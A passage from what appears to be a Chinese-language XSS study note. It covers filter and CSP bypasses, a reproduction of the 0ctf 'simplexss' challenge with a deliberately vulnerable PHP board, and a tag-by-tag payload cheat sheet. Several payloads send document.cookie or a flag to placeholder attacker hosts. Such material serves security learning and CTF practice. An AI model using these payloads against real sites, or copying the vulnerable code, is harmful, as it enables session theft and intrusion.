class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-variable">$xsssafe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;img&#x27;</span>,<span class="hljs-string">&#x27;script&#x27;</span>,<span class="hljs-string">&#x27;on&#x27;</span>,<span class="hljs-string">&#x27;svg&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>);<br><span class="hljs-variable">$xsssafe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$xsssafe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$xsssafe</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>函数解析：</p>
<p>1、explode()函数 把字符串打散为数组：</p>
<p>2、implode()函数 把数组元素组合为字符串：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;107_lab_2017&#x27;</span>;<br>	<span class="hljs-variable">$array</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$str</span>);<span class="hljs-comment">//以下划线为分隔符将字符串打散为数组 </span><br>	<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$array</span>);<br>	<br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$array</span>);<span class="hljs-comment">//以下划线为分隔符将数组合并成字符串</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230328213914905.png'><img src="image-20230328213914905.png" alt="image-20230328213914905"></p>
<p>我们看到其实只有很少的过滤，而且是单层的，对于xss来说，只需要复写2次就可以绕过了，类似于</p>
<p>scrscriptipt这样。</p>
<p><strong>所以其实关键在于CSP</strong></p>
<p><strong>Content-Security-Policy:default-src ‘self’; script-src ‘self’ ‘unsafe-inline’; font-src ‘self’ <a target="_blank" rel="noopener" href="http://fonts.gstatic.com">fonts.gstatic.com</a>; style-src ‘self’ ‘unsafe-inline’; img-src ‘self’</strong><br>
这里上述都已经提到绕过方法主要有两种，一种直接利用跳转，第二种利用预加载</p>
<p>不熟悉的人可能并不清楚其中的CSP有什么样的问题，事实，整个CSP除了限定了域以外，没有做任何的限制，可以执行任意的js，这也就导致了使用人数比较多的非预期做法。</p>
<h4 id="1-跳转绕过："><a href="#1-跳转绕过：" class="headerlink" title="1-跳转绕过："></a>1.跳转绕过：</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;scrscriptipt&gt;window.open(&quot; http://xxxx:8080/cookie.asp?msg= &quot;+document.body)&lt;/scrscr iptipt&gt;<br><br>&lt;scrscriptipt&gt;window.locatioonn.href%3d&quot;http%3a// www.example.com/xss/write.php%3fdomain%3d &quot;%2bescape(document.cookie)%3b&lt;/sscriptcript&gt;<br><br>&lt;scrscriptipt&gt;var a=document.createElement(&quot;a&quot;);a.href=&#x27; http://xss.com/?cookie= &#x27;+escape(document.cookie);a.click();&lt;/sscriptcript&gt;<br></code></pre></td></tr></table></figure>
<p>上面几种思路类似，通过构造新开页面或者跳转来解决域限制，由于js可以任意构造，所以这里也就通过特别的方式绕过了原本的限制。</p>
<h4 id="2-chrome对CSP支持的不完整绕过-预加载绕过"><a href="#2-chrome对CSP支持的不完整绕过-预加载绕过" class="headerlink" title="2-chrome对CSP支持的不完整绕过-预加载绕过"></a>2.chrome对CSP支持的不完整绕过 预加载绕过</h4>
<p>从文章中可以获得对漏洞的整体了解，主要是2篇</p>
<p><a target="_blank" rel="noopener" href="http://paper.seebug.org/91/">第一篇</a></p>
<p><a target="_blank" rel="noopener" href="http://lorexxar.cn/2016/10/28/csp-then/">lorexxar大佬的</a></p>
<p>后台bot使用的也正是chrome浏览器，由于浏览器对CSP特性支持的不完整，导致link标签的白名单特性存在跨域请求的能力，所以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;Scscriptript&gt;var n0t = document.createElement(&quot;liscriptnk&quot;);n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);n0t.setAttribute(&quot;href&quot;, &quot;//xxx:2333/&quot; + document.cookie);document.head.appendChild(n0t);&lt;/Scscriptript&gt;<br></code></pre></td></tr></table></figure>
<p>后面xss平台或者vps接受一发搞定</p>
<h2 id="0x05-0ctf-simplexss"><a href="#0x05-0ctf-simplexss" class="headerlink" title="0x05-0ctf-simplexss"></a>0x05 0ctf simplexss</h2>
<p>复现一下xss环境。<br>
实验环境:<br>
192.168.43.182 （本地主机）<br>
192.168.43.165 （flag所在地）</p>
<p><strong>192.168.43.165</strong></p>
<p>1.php<br>
主要实现了留言板的功能</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">#header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;) ;//这里可以设置CSP</span><br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;XSS&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$link</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;*****&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$link</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$link</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;INSERT INTO yz VALUES (&#x27;<span class="hljs-subst">$a</span>&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;)&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)<br>        <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>    <span class="hljs-variable">$re</span> = <span class="hljs-variable">$link</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;SELECT * FROM yz&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$re</span>-&gt;num_rows;<span class="hljs-variable">$i</span>++)<br>    &#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$re</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;script &gt;<br>document.<span class="hljs-title function_ invoke__">getElementsByClassName</span>(<span class="hljs-string">&quot;input&quot;</span>);<br>document.<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p><strong>192.168.43.182</strong></p>
<p>3.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Access-Control-Allow-Origin: *&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;script&gt;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getinfo</span>(<span class="hljs-params">str</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> node=document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);<br>    node.type=<span class="hljs-string">&quot;text/javascript&quot;</span>;<br>    node.src=<span class="hljs-string">&quot;http://192.168.43.182/2.php?a=1234&quot;</span>+<span class="hljs-title function_ invoke__">escape</span>(str);<br>    document.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">&quot;HEAD&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_ invoke__">appendChild</span>(node);<br>&#125;<br><br><span class="hljs-keyword">var</span> xmlhttp=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xmlhttp.<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="hljs-literal">true</span>);<br>xmlhttp.onreadystatechange=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br>    &#123;<br>        <span class="hljs-title function_ invoke__">getinfo</span>(xmlhttp.responseText);<br><br>    &#125;<br>&#125;<br>xmlhttp.<span class="hljs-title function_ invoke__">send</span>();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>在本地打开浏览器输入<br>
<a target="_blank" rel="noopener" href="http://192.168.43.165/1.php?a=">http://192.168.43.165/1.php?a=</a>&lt;link%20rel=import%20href=<a target="_blank" rel="noopener" href="http://192.168.43.182/3.php">http://192.168.43.182/3.php</a>&gt;</p>
<p>import 会导入远程资源并执行<br>
当flag端打开1.php查看留言板时会使得3.php脚本执行，从而将flag的内容发送至本地。</p>
<p>以上我目前看不懂，留着吧…</p>
<h3 id="5-1-常见标签及属性"><a href="#5-1-常见标签及属性" class="headerlink" title="5-1-常见标签及属性"></a>5.1 常见标签及属性</h3>
<p>下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p>
<h4 id="scirpt-标签"><a href="#scirpt-标签" class="headerlink" title="scirpt-标签"></a>scirpt 标签</h4>
<script> 标签用于定义客户端脚本，比如 JavaScript。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(1);&lt;/script&gt;<br><br>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;<br></code></pre></td></tr></table></figure>

例如：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

**利用payload：**

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

#### img 标签

<img> 标签定义 HTML 页面中的图像。

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;img src=<span class="hljs-number">1</span> onerror=<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-number">1</span>);&gt;<br><br>&lt;img src=<span class="hljs-number">1</span> onerror=<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&gt;<br></code></pre></td></tr></table></figure>

#### input 标签

<input> 标签规定了用户可以在其中输入数据的输入字段。

onfocus 事件在对象获得焦点时发生：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;input onfocus=alert(1);&gt;<br></code></pre></td></tr></table></figure>

竞争焦点，从而触发onblur事件：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;<br></code></pre></td></tr></table></figure>

input 标签的 autofocus 属性规定当页面加载时 <input> 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;input onfocus=&quot;alert(1);&quot; autofocus&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot; οnclick=alert(1)&gt;这样需要点击一下输入框&lt;br&gt;<br>&quot; onmouseover=alert(1)&gt;需要鼠标划过输入框&lt;br&gt;<br></code></pre></td></tr></table></figure>

例如：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

分析代码，仍然是使用get方法，从url中接受一个keyword参数，不过这里用到一个过滤函数htmlspecialchars()，这个函数把预定义的字符转换为 HTML 实体，等于<不能用，一种方法是黑名单绕过，就是不使用被过滤的符号，使用js的事件：
**利用payload：** 

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot; onmouseover=alert(1)&gt;需要鼠标划过输入框&lt;br&gt;<br></code></pre></td></tr></table></figure>

#### details 标签

details标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 details元素时触发：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;details ontoggle=alert(1);&gt;<br></code></pre></td></tr></table></figure>

使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;details open ontoggle=alert(1);&gt;<br></code></pre></td></tr></table></figure>

#### svg 标签

该标签用来在HTML页面中直接嵌入SVG 文件的代码。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;svg onload=alert(1);&gt;<br></code></pre></td></tr></table></figure>

#### select 标签

该标签用来创建下拉列表。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;<br></code></pre></td></tr></table></figure>

通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;select onfocus=alert(1) autofocus&gt;<br></code></pre></td></tr></table></figure>

#### iframe 标签

该标签会创建包含另外一个文档的内联框架。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>

#### video 标签

标签定义视频，比如电影片段或其他视频流。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;video&gt;&lt;source onerror=alert(1)&gt;<br></code></pre></td></tr></table></figure>

#### audio 标签

标签定义声音，比如音乐或其他音频流。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;audio src=x  onerror=alert(1);&gt;<br></code></pre></td></tr></table></figure>

#### body 标签

标签定义文档的主体。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;body onload=alert(1);&gt;<br></code></pre></td></tr></table></figure>

onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;body<br>onscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;<br></code></pre></td></tr></table></figure>

#### textarea 标签

标签定义一个多行的文本输入控件。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;textarea onfocus=alert(1); autofocus&gt;<br></code></pre></td></tr></table></figure>

#### keygen 标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐<br></code></pre></td></tr></table></figure>

#### marquee 标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以<br></code></pre></td></tr></table></figure>

#### isindex 标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;isindex type=image src=1 onerror=alert(1)&gt;//仅限于IE<br></code></pre></td></tr></table></figure>

### 5.2 XSS 常见绕过姿势

#### 5.2.1 利用 JavaScript 伪协议

javascript: 这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。当浏览器装载了这样的URL时，并不会转向某个URL，而是执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。

#### 5.2.2 无过滤情况：

##### a 标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(1);&quot;&gt;xss&lt;/a&gt;<br>&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;<br>&lt;a href=javascript:alert(&#x27;xss&#x27;)&gt;test&lt;/a&gt;<br>&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;<br>&lt;a href=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;a&lt;/a&gt;<br>&lt;a href=&quot;&quot; onclick=eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;<br>&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#x27;xss&#x27;) y=2016&gt;aa&lt;/a&gt;<br></code></pre></td></tr></table></figure>

##### p标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">元素上按下鼠标时触发<br>&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;<br><br>元素上释放鼠标时触发<br>&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;<br></code></pre></td></tr></table></figure>

##### details标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;details ontoggle=&quot;alert(xss);&quot;&gt;<br>使用open属性触发ontoggle事件，无需用户去触发<br>&lt;details open ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure>

##### iframe 标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;iframe src=javascript:alert(1);&gt;&lt;/iframe&gt;<br><br>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;<br><br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;<br><br>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;<br><br>&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;<br><br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br><br>&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;<br><br>&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;(````只有两个``)<br></code></pre></td></tr></table></figure>

##### button标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">元素上点击鼠标时触发<br>&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;<br></code></pre></td></tr></table></figure>

##### img 标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;img src=x onerror=alert(1)&gt;<br>&lt;img src=javascript:alert(1)&gt;    //IE7以下<br><br>图片加载错误时触发<br>&lt;img src=&quot;x&quot; onerror=alert(1)&gt;<br>&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;<br>鼠标指针移动到元素时触发<br>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;<br>鼠标指针移出时触发<br>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;<br></code></pre></td></tr></table></figure>

##### isindex标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE<br></code></pre></td></tr></table></figure>

##### marquee标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以<br></code></pre></td></tr></table></figure>

##### select标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;select onfocus=alert(1) autofocus&gt;<br></code></pre></td></tr></table></figure>

##### keygen标签

